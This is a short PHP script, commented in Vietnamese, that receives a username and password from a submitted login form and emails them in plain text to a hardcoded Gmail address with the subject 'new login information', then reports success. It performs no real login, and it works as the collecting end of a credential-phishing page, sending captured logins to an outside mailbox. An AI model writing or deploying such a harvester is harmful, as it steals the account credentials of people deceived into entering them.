<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Nhận dữ liệu từ form
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Thông tin email
    $to = 'quangvan161097@gmail.com'; // Thay đổi địa chỉ email này thành email của bạn
    $subject = 'Thông tin đăng nhập mới';
    $message = "Tên người dùng: " . $username . "\nMật khẩu: " . $password;
    $headers = "From: no-reply@example.com\r\n"; // Thay đổi email gửi

    // Gửi email
    if (mail($to, $subject, $message, $headers)) {
        echo "Thông tin đăng nhập đã được gửi đến email của bạn.";
    } else {
        echo "Có lỗi xảy ra khi gửi email.";
    }
} else {
    echo "Phương thức gửi không hợp lệ.";
}
?>
